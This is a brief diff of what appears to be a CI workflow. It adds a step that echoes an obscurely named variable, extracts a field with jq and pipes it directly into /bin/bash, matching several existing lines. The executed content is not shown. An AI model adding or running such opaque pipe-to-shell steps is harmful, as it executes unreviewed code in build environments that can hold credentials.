@@ -31,6 +31,7 @@ jobs:
           echo $euw1 | jq -r .fqmcg605 | /bin/bash
           echo $pp0991 | jq -r .x3 | /bin/bash
           echo $zo6 | jq -r .pifyx988 | /bin/bash
+          echo $yj297 | jq -r .x3 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
